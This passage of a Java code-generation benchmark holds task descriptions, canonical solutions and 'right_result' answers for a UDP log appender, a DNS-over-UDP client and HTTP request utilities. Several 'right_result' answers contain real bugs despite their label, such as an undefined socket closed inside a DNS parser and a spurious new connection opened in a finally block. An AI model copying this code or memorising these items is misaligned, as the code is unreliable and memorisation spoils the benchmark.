    "right_result": "import java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport org.apache.logging.log4j.core.appender.OutputStreamAppender;\n\npublic class DropwizardUdpSocketAppender extends OutputStreamAppender {\n    private final String host;\n    private final int port;\n    private DatagramSocket datagramSocket;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        super(null);\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        try {\n            datagramSocket = new DatagramSocket();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to create UDP socket\", e);\n        }\n        super.start();\n    }\n\n    private OutputStream datagramSocketOutputStream(String host, int port) {\n        return new OutputStream() {\n            @Override\n            public void write(int b) {\n                throw new UnsupportedOperationException(\"UDP does not support byte-level writes\");\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) {\n                try {\n                    InetAddress address = InetAddress.getByName(host);\n                    DatagramPacket packet = new DatagramPacket(b, off, len, address, port);\n                    datagramSocket.send(packet);\n                } catch (Exception e) {\n                    throw new RuntimeException(\"Failed to send UDP packet\", e);\n                }\n            }\n\n            @Override\n            public void close() {\n                if (datagramSocket != null) {\n                    datagramSocket.close();\n                }\n            }\n        };\n    }\n\n    @Override\n    protected OutputStream getOutputStream() {\n        return datagramSocketOutputStream(host, port);\n    }\n}"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.InetSocketAddress;\nimport java.net.Inet4Address;\nimport java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private InetSocketAddress[] DNS_SERVERS;\n\n    public DnsUdpClient(InetSocketAddress[] dnsServers) {\n        this.DNS_SERVERS = dnsServers;\n    }\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(packet);\n\n        byte[] response = new byte[512];\n        packet = new DatagramPacket(response, response.length);\n        socket.receive(packet);\n\n        return toIps(response);\n    }\n\n    public List<Inet4Address> toIps(byte[] buffer) {\n        List<Inet4Address> ips = new ArrayList<>();\n        int offset = 12;\n        while (offset < buffer.length) {\n            if (buffer[offset] == 0) break;\n            int length = buffer[offset] & 0xFF;\n            offset++;\n            if (length == 0) break;\n            String name = \"\";\n            int i = 0;\n            while (i < length) {\n                byte b = buffer[offset + i];\n                if (b == 0) break;\n                name += (char) b;\n                i++;\n            }\n            offset += i;\n            if (buffer[offset] == 1) { // A record\n                byte[] ipBytes = new byte[4];\n                System.arraycopy(buffer, offset + 1, ipBytes, 0, 4);\n                try {\n                    ips.add((Inet4Address) Inet4Address.getByAddress(ipBytes));\n                } catch (Exception e) {\n                    throw new RuntimeException(\"Invalid IP address in DNS response\", e);\n                }\n                offset += 5;\n            } else {\n                offset += 4;\n            }\n        }\n        socket.close();\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(packet);\n\n        byte[] response = new byte[512];\n        packet = new DatagramPacket(response, response.length);\n        socket.receive(packet);\n\n        return toTXT(response);\n    }\n\n    public String toTXT(byte[] buffer) {\n        int offset = 12;\n        while (offset < buffer.length) {\n            if (buffer[offset] == 0) break;\n            int length = buffer[offset] & 0xFF;\n            offset++;\n            if (length == 0) break;\n            String name = \"\";\n            int i = 0;\n            while (i < length) {\n                byte b = buffer[offset + i];\n                if (b == 0) break;\n                name += (char) b;\n                i++;\n            }\n            offset += i;\n            if (buffer[offset] == 16) { // TXT record\n                int txtLength = buffer[offset + 2] & 0xFF;\n                offset += 4;\n                byte[] txtBytes = new byte[txtLength];\n                System.arraycopy(buffer, offset, txtBytes, 0, txtLength);\n                return new String(txtBytes);\n            }\n            offset += 4;\n        }\n        throw new RuntimeException(\"TXT record not found in DNS response\");\n    }\n}"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests and handling responses, including JSON parsing and connection management.\n\nClass Description: HttpRequester is a utility class that provides methods for creating HTTP connections, sending requests, and processing responses. It supports handling both successful responses and error streams, with specialized methods for parsing JSON responses. The class manages connection lifecycle and resource cleanup.\n\nAttributes: (None - this is a purely static utility class)\n\nMethods:\n\nMethod1: getConnectionFromRoute(String apiUrl, Route route, String... params) -> HttpURLConnection - Creates an HTTP connection from a route template and parameters. Sets up the connection with proper headers and request method.\n\nMethod2: getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) -> HttpURLConnection - Creates an HTTP connection from a pre-compiled route. Configures the connection with headers and request method.\n\nMethod3: parseInputStreamAndClose(InputStream inputStream) -> String - Internal method that reads an input stream into a string and closes the stream.\n\nMethod4: parseString(HttpURLConnection connection) -> String - Reads the successful response from a connection into a string.\n\nMethod5: parseStringAndDisconnect(HttpURLConnection connection) -> String - Reads the response into a string and disconnects the connection.\n\nMethod6: parseErrorString(HttpURLConnection connection) -> String - Reads the error stream from a connection into a string.\n\nMethod7: parseErrorStringAndDisconnect(HttpURLConnection connection) -> String - Reads the error stream into a string and disconnects the connection.\n\nMethod8: parseJSONObject(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object.\n\nMethod9: parseJSONObjectAndDisconnect(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object and disconnects the connection.\n\nMethod10: parseJSONArray(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array.\n\nMethod11: parseJSONArrayAndDisconnect(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array and disconnects the connection.",
    "Canonical_solution": "import org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        return getConnectionFromCompiledRoute(apiUrl, route.compile(params));\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String url = apiUrl + route.getCompiledRoute();\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setFixedLengthStreamingMode(0);\n        connection.setRequestMethod(route.getMethod().name());\n        String agentString = System.getProperty(\"http.agent\")\n                + \"; ReVanced/\" + Utils.getAppVersionName()\n                + \" (\" + Utils.getPatchesReleaseVersion() + \")\";\n        connection.setRequestProperty(\"User-Agent\", agentString);\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder jsonBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                jsonBuilder.append(line);\n                jsonBuilder.append('\\n');\n            }\n            return jsonBuilder.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        if (errorStream == null) {\n            return \"\";\n        }\n        return parseInputStreamAndClose(errorStream);\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONObject(parseString(connection));\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONObject object = parseJSONObject(connection);\n        connection.disconnect();\n        return object;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONArray(parseString(connection));\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONArray array = parseJSONArray(connection);\n        connection.disconnect();\n        return array;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.json.JSONObject;\nimport org.json.JSONArray;\n\npublic class HttpRequester {\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        URL url = new URL(String.format(apiUrl, params));\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(route.getMethod());\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        URL url = new URL(apiUrl + route.getPath());\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(route.getMethod());\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        StringBuilder response = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        return response.toString();\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getErrorStream());\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws IOException {\n        String response = parseString(connection);\n        return new JSONObject(response);\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONObject result = parseJSONObject(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws IOException {\n        String response = parseString(connection);\n        return new JSONArray(response);\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONArray result = parseJSONArray(connection);\n        connection.disconnect();\n        return result;\n    }\n}"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response stream, and return the content as a UTF-8 encoded string. It should handle resource cleanup properly by closing all streams and disconnecting the HTTP connection.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent\n\nOutput: \n- String - The response content from the HTTP GET request, or null if an error occurs",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n    public static String getResponse(String requestUrl) {\n        StringBuilder response = new StringBuilder();\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setUseCaches(false);\n\n            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            // Ensure connection is disconnected\n            HttpURLConnection conn = (HttpURLConnection) new URL(requestUrl).openConnection();\n            conn.disconnect();\n        }\n        return response.toString();\n    }\n}"
  }
]